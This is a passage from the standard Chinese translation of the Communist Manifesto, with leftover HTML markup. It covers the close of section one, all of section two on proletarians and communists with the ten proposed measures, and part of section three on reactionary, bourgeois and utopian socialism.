工人有时也得到胜利，但这种胜利只是暂时的。他们斗争的真正成果并不是直接取得的成功，而是工人的越来越扩大的联合。这种联合由于大工业所造成的日益发达的交通工具而得到发展，这种交通工具把各地的工人彼此联系起来。只要有了这种联系，就能把许多性质相同的地方性的斗争汇合成全国性的斗争，汇合成阶级斗争。而一切阶级斗争都是政治斗争。中世纪的市民靠乡间小道需要几百年才能达到的联合，现代的无产者利用铁路只要几年就可以达到了。</p>\n<p>　　无产者组织成为阶级，从而组织成为政党这件事，不断地由于工人的自相竞争而受到破坏。但是，这种组织总是重新产生，并且一次比一次更强大，更坚固，更有力。它利用资产阶级内部的分裂，迫使他们用法律形式承认工人的个别利益。英国的十小时工作日法案就是一个例子。</p>\n<p>　　旧社会内部的所有冲突在许多方面都促进了无产阶级的发展。资产阶级处于不断的斗争中：最初反对贵族：后来反对同工业进步有利害冲突的那部分资产阶级；经常反对一切外国的资产阶级。在这一切斗争中，资产阶级都不得不向无产阶级呼吁，要求无产阶级援助，这样就把无产阶级卷进了政治运动。于是，资产阶级自己就把自己的教育因素即反对自身的武器给予了无产阶级。</p>\n<p>　　其次，我们已经看到，工业的进步把统治阶级的整批成员拋到无产阶级队伍里去，或者至少也使他们的生活条件受到威胁。他们也给无产阶级带来了大量的教育因素。</p>\n<p>　　最后，在阶级斗争接近决战的时期，统治阶级内部的、整个旧社会内部的瓦解过程，就达到非常强烈、非常尖锐的程度，甚至使得统治阶级中的一小部分人脱离统治阶级而归附于革命的阶级，即掌握着未来的阶级。所以，正像过去贵族中有一部分人转到资产阶级方面一样，现在资产阶级中也有一部分人，特别是已经提高到从理论上认识整个历史运动这一水平的一部分资产阶级思想家，转到无产阶级方面来了。</p>\n<p>　　在当前同资产阶级对立的一切阶级中，只有无产阶级是真正革命的阶级。其余的阶级都随着大工业的发展而日趋没落和灭亡，无产阶级却是大工业本身的产物。</p>\n<p>　　中间等级，即小工业家、小商人、手工业者、农民，他们同资产阶级作斗争，都是为了维护他们这种中间等级的生存，以免于灭亡。所以，他们不是革命的，而是保守的。不仅如此，他们甚至是反动的，因为他们力图使历史的车轮倒转。如果说他们是革命的，那是鉴于他们行将转入无产阶级的队伍，这样，他们就不是维护他们目前的利益，而是维护他们将来的利益，他们就离开自己原来的立场，而站到无产阶级的立场上来。</p>\n<p>　　流氓无产阶级是旧社会最下层中消极的腐化的部分，他们在一些地方也被无产阶级革命卷到运动里来，但是，由于他们的整个生活状况，他们更甘心于被人收买，去干反动的勾当。</p>\n<p>　　在无产阶级的生活条件中，旧社会的生活条件已经被消灭了。无产者是没有财产的；他们和妻子儿女的关系同资产阶级的家庭关系再没有任何共同之处了；现代的工业劳动，现代的资本压迫，无论在英国或法国，无论在美国或德国，都是一样的，都使无产者失去了任何民族性。法律、道德、宗教，在他们看来全都是资产阶级偏见，隐藏在这些偏见后面的全都是资产阶级利益。</p>\n<p>　　过去一切阶级在争得统治之后，总是使整个社会服从于它们发财致富的条件，企图以此来巩固它们已经获得的生活地位。无产者只有废除自己的现存的占有方式，从而废除全部现存的占有方式，才能取得社会生产力。无产者没有什么自己的东西必须加以保护，他们必须摧毁至今保护和保障私有财产的一切。</p>\n<p>　　过去的一切运动都是少数人的或者为少数人谋利益的运动。无产阶级的运动是绝大多数人的、为绝大多数人谋利益的独立的运动。无产阶级，现今社会的最下层，如果不炸毁构成官方社会的整个上层，就不能抬起头来，挺起胸来。</p>\n<p>　　如果不就内容而就形式来说，无产阶级反对资产阶级的斗争首先是一国范围内的斗争。每一个国家的无产阶级当然首先应该打倒本国的资产阶级。</p>\n<p>　　在叙述无产阶级发展的最一般的阶段的时候，我们循序探讨了现存社会内部或多或少隐蔽着的国内战争，直到这个战争爆发为公开的革命，无产阶级用暴力推翻资产阶级而建立自己的统治。</p>\n<p>　　我们已经看到，至今的一切社会都是建立在压迫阶级和被压迫阶级的对立之上的。但是，为了有可能压迫一个阶级，就必须保证这个阶级至少有能够勉强维持它的奴隶般的生存的条件。农奴曾经在农奴制度下挣扎到公社社员的地位，小资产者曾经在封建专制制度的束缚下挣扎到资产者的地位。现代的工人却相反，他们并不是随着工业的进步而上升，而是越来越降到本阶级的生存条件以下。工人变成赤贫者，贫困比人口和财富增长得还要快。由此可以明显地看出，资产阶级再不能做社会的统治阶级了，再不能把自己阶级的生存条件当做支配一切的规律强加于社会了。资产阶级不能统治下去了，因为它甚至不能保证自己的奴隶维持奴隶的生活，因为它不得不让自己的奴隶落到不能养活它反而要它来养活的地步。社会再不能在它统治下生活下去了，就是说，它的存在不再同社会兼容了。</p>\n<p>　　资产阶级生存和统治的根本条件，是财富在私人手里的积累，是资本的形成和增殖；资本的条件是雇佣劳动。雇佣劳动完全是建立在工人的自相竞争之上的。资产阶级无意中造成而又无力抵抗的工业进步，使工人通过结社而达到的革命联合代替了他们由于竞争而造成的分散状态。于是，随着大工业的发展，资产阶级赖以生产和占有产品的基础本身也就从它的脚下被挖掉了。它首先生产的是它自身的掘墓人。资产阶级的灭亡和无产阶级的胜利是同样不可避免的。</p>\n<h1 id=\"二、无产者和共产党人\"><a href=\"#二、无产者和共产党人\" class=\"headerlink\" title=\"二、无产者和共产党人\"></a>二、无产者和共产党人</h1><p>　　共产党人同全体无产者的关系是怎样的呢？</p>\n<p>　　共产党人不是同其它工人政党相对立的特殊政党。</p>\n<p>　　他们没有任何同整个无产阶级的利益不同的利益。</p>\n<p>　　他们不提出任何特殊的原则，用以塑造无产阶级的运动。</p>\n<p>　　共产党人同其它无产阶级政党不同的地方只是：一方面，在各国无产者的斗争中，共产党人强调和坚持整个无产阶级共同的不分民族的利益；另一方面，在无产阶级和资产阶级的斗争所经历的各个发展阶段上，共产党人始终代表整个运动的利益。</p>\n<p>　　因此，在实践方面，共产党人是各国工人政党中最坚决的、始终起推动作用的部分；在理论方面，他们胜过其余的无产阶级群众的地方在于他们了解无产阶级运动的条件、进程和一般结果。</p>\n<p>　　共产党人的最近目的是和其它一切无产阶级政党的最近目的一样的：使无产阶级形成为阶级，推翻资产阶级的统治，由无产阶级夺取政权。</p>\n<p>　　共产党人的理论原理，决不是以这个或那个世界改革家所发明或发现的思想、原则为根据的。</p>\n<p>　　这些原理不过是现在的阶级斗争、我们眼前的历史运动的真实关系的一般表述。废除先前存在的所有制关系，并不是共产主义所独具的特征。</p>\n<p>　　一切所有制关系都经历了经常的历史更替、经常的历史变更。</p>\n<p>　　例如，法国革命废除了封建的所有制，代之以资产阶级的所有制。</p>\n<p>　　共产主义的特征并不是要废除一般的所有制，而是要废除资产阶级的所有制。</p>\n<p>　　但是，现代的资产阶级私有制是建立在阶级对立上面、建立在一些人对另一些人的剥削上面的产品生产和占有的最后而又最完备的表现。</p>\n<p>　　从这个意义上说，共产党人可以把自己的理论概括为一句话：消灭私有制。</p>\n<p>　　有人责备我们共产党人，说我们要消灭个人挣得的、自己劳动得来的财产，要消灭构成个人的一切自由、活动和独立的基础的财产。</p>\n<p>　　好一个劳动得来的、自己挣得的、自己赚来的财产！你们说的是资产阶级所有制以前的那种小资产阶级的、小农的财产吗？那种财产用不着我们去消灭，工业的发展已经把它消灭了，而且每天都在消灭它。</p>\n<p>　　或者，你们说的是现代的资产阶级的私有财产吧？</p>\n<p>　　但是，难道雇佣劳动，无产者的劳动，会给无产者创造出财产来吗？没有的事。这种劳动所创造的是资本，即剥削雇佣劳动的财产，只有在不断产生出新的雇佣劳动来重新加以剥削的条件下才能增加起来的财产。现今的这种财产是在资本和雇佣劳动的对立中运动的。让我们来看看这种对立的两个方面吧。</p>\n<p>　　做一个资本家，这就是说，他在生产中不仅占有一种纯粹个人的地位，而且占有一种社会的地位。资本是集体的产物，它只有通过社会许多成员的共同活动，而且归根到底只有通过社会全体成员的共同活动，才能运动起来。</p>\n<p>　　因此，资本不是一种个人力量，而是一种社会力量。</p>\n<p>　　因此，把资本变为公共的、属于社会全体成员的财产，这并不是把个人财产变为社会财产。这时所改变的只是财产的社会性质。它将失掉它的阶级性质。</p>\n<p>　　现在，我们来看看雇佣劳动。</p>\n<p>　　雇佣劳动的平均价格是最低限度的工资，即工人为维持其工人的生活所必需的生活资料的数额。因此，雇佣工人靠自己的劳动所占有的东西，只够勉强维持他的生命的再生产。我们决不打算消灭这种供直接生命再生产用的劳动产品的个人占有，这种占有并不会留下任何剩余的东西使人们有可能支配别人的劳动。我们要消灭的只是这种占有的可怜的性质，在这种占有下，工人仅仅为增殖资本而活着，只有在统治阶级的利益需要他活着的时候才能活着。</p>\n<p>　　在资产阶级社会里，活的劳动只是增殖已经积累起来的劳动的一种手段。在共产主义社会里，已经积累起来的劳动只是扩大、丰富和提高工人的生活的一种手段。</p>\n<p>　　因此，在资产阶级社会里是过去支配现在，在共产主义社会里是现在支配过去。在资产阶级社会里，资本具有独立性和个性，而活动着的个人却没有独立性和个性。</p>\n<p>　　而资产阶级却把消灭这种关系说成是消灭个性和自由！说对了。的确，正是要消灭资产者的个性、独立性和自由。</p>\n<p>　　在现今的资产阶级生产关系的范围内，所谓自由就是自由贸易，自由买卖。</p>\n<p>　　但是，买卖一消失，自由买卖也就会消失。关于自由买卖的言论，也象我们的资产阶级的其它一切关于自由的大话一样，仅仅对于不自由的买卖来说，对于中世纪被奴役的市民来说，才是有意义的，而对于共产主义要消灭买卖、消灭资产阶级生产关系和资产阶级本身这一点来说，却是毫无意义的。</p>\n<p>　　我们要消灭私有制，你们就惊慌起来。但是，在你们的现存社会里，私有财产对十分之九的成员来说已经被消灭了；这种私有制之所以存在，正是因为私有财产对十分之九的成员来说已经不存在。可见，你们责备我们，是说我们要消灭那种以社会上的绝大多数人没有财产为必要条件的所有制。</p>\n<p>　　总而言之，你们责备我们，是说我们要消灭你们的那种所有制。的确，我们是要这样做的。</p>\n<p>　　从劳动不再能变为资本、货币、地租，一句话，不再能变为可以垄断的社会力量的时候起，就是说，从个人财产不再能变为资产阶级财产的时候起，你们说，个性就被消灭了。</p>\n<p>　　由此可见，你们是承认，你们所理解的个性，不外是资产者、资产阶级私有者。这样的个性确实应当被消灭。</p>\n<p>　　共产主义并不剥夺任何人占有社会产品的权力，它只剥夺利用这种占有去奴役他人劳动的权力。</p>\n<p>　　有人反驳说，私有制一消灭，一切活动就会停止，懒惰之风就会兴起。</p>\n<p>　　这样说来，资产阶级社会早就应该因懒惰而灭亡了，因为在这个社会里是劳者不获，获者不劳的。所有这些顾虑，都可以归结为这样一个同义反复：一旦没有资本，也就不再有雇佣劳动了。</p>\n<p>　　所有这些对共产主义的物质产品的占有方式和生产方式的责备， 也被扩及到精神产品的占有和生产方面。正如阶级的所有制的终止在资产者看来是生产本身的终止一样，阶级的教育的终止在他们看来就等于一切教育的终止。</p>\n<p>　　资产者唯恐失去的那种教育，对绝大多数人来说是把人训练成机器。</p>\n<p>　　但是，你们既然用你们资产阶级关于自由、教育、法等等的观念来衡量废除资产阶级所有制的主张，那就请你们不要同我们争论了。你们的观念本身是资产阶级的生产关系和所有制关系的产物，正象你们的法不过是被奉为法律的你们这个阶级的意志一样，而这种意志的内容是由你们这个阶级的物质生活条件来决定的。</p>\n<p>　　你们的利己观念使你们把自己的生产关系和所有制关系从历史的、在生产过程中是暂时的关系变成永恒的自然规律和理性规律，这种利己观念是你们和一切灭亡了的统治阶级所共有的。谈到古代所有制的时候你们所能理解的，谈到封建所有制的时候你们所能理解的，一谈到资产阶级所有制你们就再也不能理解了。</p>\n<p>　　消灭家庭！连极端的激进派也对共产党人的这种可耻的意图表示愤慨。</p>\n<p>　　现代的、资产阶级的家庭是建立在什么基础上的呢？是建立在资本上面，建立在私人发财上面的。这种家庭只是在资产阶级那里才以充分发展的形式存在着，而无产者的被迫独居和公开的卖淫则是它的补充。</p>\n<p>　　资产者的家庭自然会随着它的这种补充的消失而消失，两者都要随着资本的消失而消失。</p>\n<p>　　你们是责备我们要消灭父母对子女的剥削吗？我们承认这种罪状。</p>\n<p>　　但是，你们说，我们用社会教育代替家庭教育，就是要消灭人们最亲密的关系。</p>\n<p>　　而你们的教育不也是由社会决定的吗？不也是由你们进行教育的那种社会关系决定的吗？不也是由社会通过学校等等进行的直接的或间接的干涉决定的吗？共产党人并没有发明社会对教育的影响；他们仅仅是要改变这种影响的性质，要使教育摆脱统治阶级的影响。</p>\n<p>　　无产者的一切家庭联系越是由于大工业的发展而被破坏，他们的子女越是由于这种发展而被变成单纯的商品和劳动工具，资产阶级关于家庭和教育、关于父母和子女的亲密关系的空话就越是令人作呕。</p>\n<p>　　但是，你们共产党人是要实行公妻制的啊，——整个资产阶级异口同声地向我们这样叫喊。</p>\n<p>　　资产者是把自己的妻子看作单纯的生产工具的。他们听说生产工具将要公共使用，自然就不能不想到妇女也会遭到同样的命运。</p>\n<p>　　他们想也没有想到，问题正在于使妇女不再处于单纯生产工具的地位。</p>\n<p>　　其实，我们的资产者装得道貌岸然，对所谓的共产党人的正式公妻制表示惊讶，那是再可笑不过了。公妻制无需共产党人来实行，它差不多是一向就有的。</p>\n<p>　　我们的资产者不以他们的无产者的妻子和女儿受他们支配为满足，正式的卖淫更不必说了，他们还以互相诱奸妻子为最大的享乐。</p>\n<p>　　资产阶级的婚姻实际上是公妻制。人们至多只能责备共产党人，说他们想用正式的、公开的公妻制来代替伪善地掩蔽着的公妻制。其实，不言而喻，随着现在的生产关系的消灭，从这种关系中产生的公妻制，即正式的和非正式的卖淫，也就消失了。</p>\n<p>　　还有人责备共产党人，说他们要取消祖国，取消民族。</p>\n<p>　　工人没有祖国。决不能剥夺他们所没有的东西。因为无产阶级首先必须取得政治统治，上升为民族的阶级，把自身组织成为民族，所以它本身还是民族的，虽然完全不是资产阶级所理解的那种意思。</p>\n<p>　　随着资产阶级的发展，随着贸易自由的实现和世界市场的建立，随着工业生产以及与之相适应的生活条件的趋于一致，各国人民之间的民族隔绝和对立日益消失。</p>\n<p>　　无产阶级的统治将使它们更快地消失。联合的行动，至少是各文明国家的联合的行动，是无产阶级获得解放的首要条件之一。</p>\n<p>　　人对人的剥削一消灭，民族对民族的剥削就会随之消灭。</p>\n<p>　　民族内部的阶级对立一消失，民族之间的敌对关系就会随之消失。</p>\n<p>　　从宗教的、哲学的和一般意识形态的观点对共产主义提出的种种责难，都不值得详细讨论了。</p>\n<p>　　人们的观念、观点和概念，一句话，人们的意识，随着人们的生活条件、人们的社会关系、人们的社会存在的改变而改变，这难道需要经过深思才能了解吗？</p>\n<p>　　思想的历史除了证明精神生产随着物质生产的改造而改造，还证明了什么呢？任何一个时代的统治思想始终都不过是统治阶级的思想。</p>\n<p>　　当人们谈到使整个社会革命化的思想时，他们只是表明了一个事实：在旧社会内部已经形成了新社会的因素，旧思想的瓦解是同旧生活条件的瓦解步调一致的。</p>\n<p>　　当古代世界走向灭亡的时候，古代的各种宗教就被基督教战胜了。当基督教思想在18世纪被启蒙思想击败的时候，封建社会正在同当时革命的资产阶级进行殊死的斗争。信仰自由和宗教自由的思想，不过表明自由竞争在信仰的领域里占统治地位罢了。</p>\n<p>　　“但是”，有人会说，“宗教的、道德的、哲学的、政治的、法的观念等等在历史发展的进程中固然是不断改变的，而宗教、道德、哲学、政治和法在这种变化中却始终保存着。</p>\n<p>　　此外，还存在着一切社会状态所共有的永恒的真理，如自由、正义等等。但是共产主义要废除永恒真理，它要废除宗教、道德，而不是加以革新，所以共产主义是同至今的全部历史发展进程相矛盾的。”</p>\n<p>　　这种责难归结为什么呢？至今的一切社会的历史都是在阶级对立中运动的，而这种对立在各个不同的时代具有不同的形式。</p>\n<p>　　但是，不管阶级对立具有什么样的形式，社会上一部分人对另一部分人的剥削却是过去各个世纪所共有的事实。因此，毫不奇怪，各个世纪的社会意识，尽管形形色色、千差万别，总是在某些共同的形式中运动的，这些形式，这些意识形式，只有当阶级对立完全消失的时候才会完全消失。</p>\n<p>　　共产主义革命就是同传统的所有制关系实行最彻底的决裂；毫不奇怪，它在自己的发展进程中要同传统的观念实行最彻底的决裂。</p>\n<p>　　不过，我们还是把资产阶级对共产主义的种种责难撇开吧。</p>\n<p>　　前面我们已经看到，工人革命的第一步就是使无产阶级上升为统治阶级，争得民主。</p>\n<p>　　无产阶级将利用自己的政治统治，一步一步地夺取资产阶级的全部资本，把一切生产工具集中在国家即组织成为统治阶级的无产阶级手里，并且尽可能快地增加生产力的总量。</p>\n<p>　　要做到这一点，当然首先必须对所有权和资产阶级生产关系实行强制性的干涉，也就是采取这样一些措施，这些措施在经济上似乎是不够充分的和没有力量的，但是在运动进程中它们会越出本身，而且作为变革全部生产方式的手段是必不可少的。</p>\n<p>　　这些措施在不同的国家里当然会是不同的。</p>\n<p>　　但是，最先进的国家几乎都可以采取下面的措施：</p>\n<p>　　1．剥夺地产，把地租用于国家支出。</p>\n<p>　　2．征收高额累进税。</p>\n<p>　　3．废除继承权。</p>\n<p>　　4．没收一切流亡分子和叛乱分子的财产。</p>\n<p>　　5．通过拥有国家资本和独享垄断权的国家银行，把信贷集中在国家手里。</p>\n<p>　　6．把全部运输业集中在国家手里。</p>\n<p>　　7．按照总的计划增加国营工厂和生产工具，开垦荒地和改良土壤。</p>\n<p>　　8．实行普遍劳动义务制，成立产业军，特别是在农业方面。</p>\n<p>　　9．把农业和工业结合起来，促使城乡对立逐步消灭。</p>\n<p>　　10．对所有儿童实行公共的和免费的教育。取消现在这种形式的儿童的工厂劳动。把教育同物质生产结合起来，等等。</p>\n<p>　　当阶级差别在发展进程中已经消失而全部生产集中在联合起来的个人的手里的时候，公共权力就失去政治性质。原来意义上的政治权力，是一个阶级用以压迫另一个阶级的有组织的暴力。如果说无产阶级在反对资产阶级的斗争中一定要联合为阶级，如果说它通过革命使自己成为统治阶级，并以统治阶级的资格用暴力消灭旧的生产关系，那么它在消灭这种生产关系的同时，也就消灭了阶级对立和阶级本身的存在条件，从而消灭了它自己这个阶级的统治。</p>\n<p>　　代替那存在着阶级和阶级对立的资产阶级旧社会的，将是这样一个联合体，在那里，每个人的自由发展是一切人的自由发展的条件。</p>\n<h1 id=\"三、社会主义的和共产主义的文献\"><a href=\"#三、社会主义的和共产主义的文献\" class=\"headerlink\" title=\"三、社会主义的和共产主义的文献\"></a>三、社会主义的和共产主义的文献</h1><p>1．反动的社会主义</p>\n<p>(甲)封建的社会主义</p>\n<p>　　法国和英国的贵族，按照他们的历史地位所负的使命，就是写一些抨击现代资产阶级社会的作品。在法国的1830年七月革命和英国的改革运动中，他们再一次被可恨的暴发户打败了。从此就再谈不上严重的政治斗争了。他们还能进行的只是文字斗争。但是，即使在文字方面也不可能重弹复辟时期的老调了。为了激起同情，贵族们不得不装模做样，似乎他们已经不关心自身的利益，只是为了被剥削的工人阶级的利益才去写对资产阶级的控诉书。他们用来泄愤的手段是：唱唱诅咒他们的新统治者的歌，并向他叽叽咕咕地说一些或多或少凶险的预言。<br>　　这样就产生了封建的社会主义，半是挽歌，半是谤文；半是过去的回音，半是未来的恫吓；它有时也能用辛辣、俏皮而尖刻的评论刺中资产阶级的心，但是它由于完全不能理解现代历史的进程而总是令人感到可笑。<br>　　为了拉拢人民，贵族们把无产阶级的乞食袋当做旗帜来挥舞。但是，每当人民跟着他们走的时候，都发现他们的臀部带有旧的封建纹章，于是就哈哈大笑，一哄而散。<br>　　一部分法国正统派和“青年英国”，都演过这出戏。<br>　　封建主说，他们的剥削方式和资产阶级的剥削不同，那他们只是忘记了，他们是在完全不同的、目前已经过时的情况和条件下进行剥削的。他们说，在他们的统治下并没有出现过现代的无产阶级，那他们只是忘记了，现代的资产阶级正是他们的社会制度的必然产物。<br>　　不过，他们毫不掩饰自己的批评的反动性质，他们控告资产阶级的主要罪状正是在于：在资产阶级的统治下有一个将把整个旧社会制度炸毁的阶级发展起来。<br>　　他们责备资产阶级，与其说是因为它产生了无产阶级，不如说是因为它产生了革命的无产阶级。<br>　　因此，在政治实践中，他们参与对工人阶级采取的一切暴力措施，在日常生活中，他们违背自己的那一套冠冕堂皇的言词，屈尊拾取金苹果，不顾信义、仁爱和名誉去做羊毛、甜菜和烧酒的买卖。<br>　　正如僧侣总是同封建主携手同行一样，僧侣的社会主义也总是同封建的社会主义携手同行的。<br>　　要给基督教禁欲主义涂上一层社会主义的色彩，是再容易不过了。基督教不是也激烈反对私有制，反对婚姻，反对国家吗？它不是提倡用行善和求乞、独身和禁欲、修道和礼拜来代替这一切吗？基督教的社会主义，只不过是僧侣用来使贵族的怨愤神圣化的圣水罢了。</p>\n<p>(乙)小资产阶级的社会主义</p>\n<p>　　封建贵族并不是被资产阶级所推翻的、其生活条件在现代资产阶级社会里日益恶化和消失的唯一阶级。中世纪的城关市民等级和小农等级是现代资产阶级的前身。在工商业不很发达的国家里，这个阶级还在新兴的资产阶级身旁勉强生存着。<br>　　在现代文明已经发展的国家里,形成了一个新的小资产阶级，它摇摆于无产阶级和资产阶级之间，并且作为资产阶级社会的补充部分不断地重新组成。但是，这一阶级的成员经常被竞争拋到无产阶级队伍里去，而且，随着大工业的发展，他们甚至觉察到，他们很快就会完全失去他们作为现代社会中一个独立部分的地位，在商业、工业和农业中很快就会被监工和雇员所代替。<br>　　在农民阶级远远超过人口半数的国家，例如在法国，那些站在无产阶级方面反对资产阶级的著作家，自然是用小资产阶级和小农的尺度去批判资产阶级制度的，是从小资产阶级的立场出发替工人说话的。这样就形成了小资产阶级的社会主义。西斯蒙第不仅对法国而且对英国来说都是这类著作家的首领。<br>　　这种社会主义非常透彻地分析了现代生产关系中的矛盾。它揭穿了经济学家的虚伪的粉饰。它确凿地证明了机器和分工的破坏作用、资本和地产的积聚、生产过剩、危机、小资产者和小农的必然没落、无产阶级的贫困、生产的无政府状态、财富分配的极不平均、各民族之间的毁灭性的工业战争，以及旧风尚、旧家庭关系和旧民族性的解体。<br>　　但是，这种社会主义按其实际内容来说，或者是企图恢复旧的生产资料和交换手段，从而恢复旧的所有制关系和旧的社会，或者是企图重新把现代的生产资料和交换手段硬塞到已被它们突破而且必然被突破的旧的所有制关系的框子里去。它在这两种场合都是反动的，同时又是空想的。<br>　　工业中的行会制度，农业中的宗法经济，——这就是它的最后结论。<br>　　这一思潮在它以后的发展中变成了一种怯懦的悲叹。</p>\n<p>(丙)德国的或“真正的”社会主义</p>\n<p>　　法国的社会主义和共产主义的文献是在居于统治地位的资产阶级的压迫下产生的，并且是同这种统治作斗争的文字表现，这种文献被搬到德国的时候，那里的资产阶级才刚刚开始进行反对封建专制制度的斗争。<br>　　德国的哲学家、半哲学家和美文学家，贪婪地抓住了这种文献，不过他们忘记了：在这种著作从法国搬到德国的时候，法国的生活条件却没有同时搬过去。在德国的条件下，法国的文献完全失去了直接实践的意义，而只具有纯粹文献的形式。它必然表现为关于真正的社会、关于实现人的本质的无谓思辨。这样，第一次法国革命的要求，在18世纪的德国哲学家看来，不过是一般“实践理性”的要求，而革命的法国资产阶级的意志的表现，在他们心目中就是纯粹意志、本来的意志、真正人的意志的规律。<br>　　德国著作家的唯一工作，就是把新的法国的思想同他们的旧的哲学信仰调和起来，或者毋宁说，就是从他们的哲学观点出发去掌握法国的思想。<br>　　这种掌握，就象掌握外国语一样，是通过翻译的。<br>　　大家知道，僧侣们曾经在古代异教经典的手抄本上面写上荒诞的天主教圣徒传。德国著作家对世俗的法国文献采取相反的作法。他们在法国的原著下面写上自己的哲学胡说。例如，他们在法国人对货币关系的批判下面写上“人的本质的外化”，在法国人对资产阶级国家的批判下面写上所谓“抽象普遍物的统治的扬弃”，等等。<br>　　这种在法国人的论述下面塞进自己哲学词句的作法，他们称之为“行动的哲学”、“真正的社会主义”、“德国的社会主义科学”、“社会主义的哲学论证”，等等。<br>　　法国的社会主义和共产主义的文献就这样被完全阉割了。既然这种文献在德国人手里已不再表现一个阶级反对另一个阶级的斗争，于是德国人就认为：他们克服了“法国人的片面性”，他们不代表真实的要求，而代表真理的要求，不代表无产者的利益，而代表人的本质的利益，即一般人的利益，这种人不属于任何阶级，根本不存在于现实界，而只存在于云雾弥漫的哲学幻想的太空。<br>　　这种曾经郑重其事地看待自己那一套拙劣的小学生作业并且大言不惭地加以吹嘘的德国社会主义，现在渐渐失去了它的自炫博学的天真。<br>　　德国的特别是普鲁士的资产阶级反对封建主和专制王朝的斗争，一句话，自由主义运动，越来越严重了。<br>　　于是，“真正的”社会主义就得到了一个好机会，把社会主义的要求同政治运动对立起来，用诅咒异端邪说的传统办法诅咒自由主义，诅咒代议制国家，诅咒资产阶级的竞争、资产阶级的新闻出版自由、资产阶级的法、资产阶级的自由和平等，并且向人民群众大肆宣扬，说什么在这个资产阶级运动中，人民群众非但一无所得，反而会失去一切。德国的社会主义恰好忘记了，法国的批判(德国的社会主义是这种批判的可怜的回声)是以现代的资产阶级社会以及相应的物质生活条件和相当的政治制度为前提的，而这一切前提当时在德国正是尚待争取的。<br>　　这种社会主义成了德意志各邦专制政府及其随从——僧侣、教员、容克和官僚求之不得的、吓唬来势汹汹的资产阶级的稻草人。<br>　　这种社会主义是这些政府用来镇压德国工人起义的毒辣的皮鞭和枪弹的甜蜜的补充。<br>　　既然“真正的”社会主义就这样成了这些政府对付德国资产阶级的武器，那么它也就直接代表了一种反动的利益，即德国小市民的利益。在德国，16世纪遗留下来的、从那时起经常以不同形式重新出现的小资产阶级，是现存制度的真实的社会基础。<br>　　保存这个小资产阶级，就是保存德国的现存制度。这个阶级胆战心惊地从资产阶级的工业统治和政治统治那里等候着无可幸免的灭亡，这一方面是由于资本的积聚，另一方面是由于革命无产阶级的兴起。在它看来，“真正的”社会主义能起一箭双雕的作用。“真正的”社会主义象瘟疫一样流行起来了。<br>　　德国的社会主义者给自己的那几条干瘪的“永恒真理”披上一件用思辨的蛛丝织成的、绣满华丽辞藻的花朵和浸透甜情蜜意的甘露的外衣，这件光彩夺目的外衣只是使他们的货物在这些顾客中间增加销路罢了。<br>　　同时，德国的社会主义也越来越认识到自己的使命就是充当这种小市民的夸夸其谈的代言人。<br>　　它宣布德意志民族是模范的民族，德国小市民是模范的人。它给这些小市民的每一种丑行都加上奥秘的、高尚的、社会主义的意义，使之变成完全相反的东西。它发展到最后，就直接反对共产主义的“野蛮破坏的”倾向，并且宣布自己是不偏不倚的超乎任何阶级斗争之上的。现今在德国流行的一切所谓社会主义和共产主义的著作，除了极少数的例外，都属于这一类卑鄙龌龊的、令人委靡的文献。</p>\n<p>2．保守的或资产阶级的社会主义</p>\n<p>　　资产阶级中的一部分人想要消除社会的弊病，以便保障资产阶级社会的生存。<br>　　这一部分人包括：经济学家、博爱主义者、人道主义者、劳动阶级状况改善派、慈善事业组织者、动物保护协会会员、戒酒协会发起人以及形形式色色的小改良家。这种资产阶级的社会主义甚至被制成一些完整的体系。<br>　　我们可以举蒲鲁东的《贫困的哲学》作为例子。<br>　　社会主义的资产者愿意要现代社会的生存条件，但是不要由这些条件必然产生的斗争和危险。他们愿意要现存的社会，但是不要那些使这个社会革命化和瓦解的因素。他们愿意要资产阶级，但是不要无产阶级。在资产阶级看来，它所统治的世界自然是最美好的世界。资产阶级的社会主义把这种安慰人心的观念制成半套或整套的体系。它要求无产阶级实现它的体系，走进新的耶路撒冷，其实它不过是要求无产阶级停留在现今的社会里，但是要拋弃他们关于这个社会的可恶的观念。<br>　　这种社会主义的另一种不够系统、但是比较实际的形式，力图使工人阶级厌弃一切革命运动，硬说能给工人阶级带来好处的并不是这样或那样的政治改革，而仅仅是物质生活条件即经济关系的改变。但是，这种社会主义所理解的物质生活条件的改变，绝对不是只有通过革命的途径才能实现的资产阶级生产关系的消灭，而是一些行政上的改良，这些改良是在这种生产关系的基础上实行的，因而丝毫不会改变资本和雇佣劳动的关系，至多只能减少资产阶级的统治费用和简化它的财政管理。<br>　　资产阶级的社会主义只有在它变成纯粹的演说辞令的时候，才获得自己的适当的表现。<br>　　自由贸易！为了工人阶级的利益；保护关税！为了工人阶级的利益；单身牢房！为了工人阶级的利益。——这才是资产阶级的社会主义唯一认真说出的最后的话。<br>　　资产阶级的社会主义就是这样一个论断：资产者之为资产者，是为了工人阶级的利益。</p>\n<p>3．批判的空想的社会主义和共产主义</p>\n<p>　　在这里，我们不谈在现代一切大革命中表达过无产阶级要求的文献(巴贝夫等人的著作)。</p>\n<p>　　无产阶级在普遍激动的时代、在推翻封建社会的时期直接实现自己阶级利益的最初尝试，都不可避免地遭到了失败，这是由于当时无产阶级本身还不够发展，由于无产阶级解放的物质条件还没有具备，这些条件只是资产阶级时代的产物。随着这些早期的无产阶级运动而出现的革命文献，就其内容来说必然是反动的。这种文献倡导普遍的禁欲主义和粗陋的平均主义。</p>\n<p>　　本来意义的社会主义和共产主义的体系，圣西门、傅立叶、欧文等人的体系，是在无产阶级和资产阶级之间的斗争还不发展的最初时期出现的。关于这个时期，我们在前面已经叙述过了(见《资产阶级和无产阶级》)。</p>\n<p>　　诚然，这些体系的发明家看到了阶级的对立，以及占统治地位的社会本身中的瓦解因素的作用。但是，他们看不到无产阶级方面的任何历史主动性，看不到它所特有的任何政治运动。</p>\n<p>　　由于阶级对立的发展是同工业的发展步调一致的，所以这些发明家也不可能看到无产阶级解放的物质条件，于是他们就去探求某种社会科学、社会规律，以便创造这些条件。</p>\n<p>　　社会的活动要由他们个人的发明活动来代替，解放的历史条件要由幻想的条件来代替，无产阶级的逐步组织成为阶级要由他们特意设计出来的社会组织来代替。在他们看来，今后的世界历史不过是宣传和实施他们的社会计划。</p>\n<p>　　诚然，他们也意识到，他们的计划主要是代表工人阶级这一受苦最深的阶级的利益。在他们的心目中，无产阶级只是一个受苦最深的阶级。</p>\n<p>　　